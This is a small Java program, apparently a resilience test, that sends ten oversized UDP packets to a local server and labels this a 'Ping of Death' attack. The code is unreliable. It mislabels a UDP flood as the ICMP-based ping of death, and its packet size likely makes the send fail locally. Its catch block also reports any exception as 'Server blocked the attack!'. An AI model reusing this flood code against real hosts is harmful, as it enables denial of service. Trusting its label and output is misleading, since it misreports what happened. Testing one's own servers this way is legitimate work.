package safety.attacks;

import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;

public class PingOfDeathAttack {
    private static final String SERVER_IP = "127.0.0.1";
    private static final int SERVER_PORT = 5000;

    public static void main(String[] args) {
        try {
            byte[] buffer = new byte[65535]; // Large packet size
            InetAddress address = InetAddress.getByName(SERVER_IP);
            DatagramSocket socket = new DatagramSocket();

            for (int i = 0; i < 10; i++) { // Send 10 large packets
                DatagramPacket packet = new DatagramPacket(buffer, buffer.length, address, SERVER_PORT);
                socket.send(packet);
                System.out.println("Ping of Death Attack packet sent: " + i);
            }
            socket.close();
        } catch (Exception e) {
            System.out.println("Server blocked the attack!");
        }
    }
}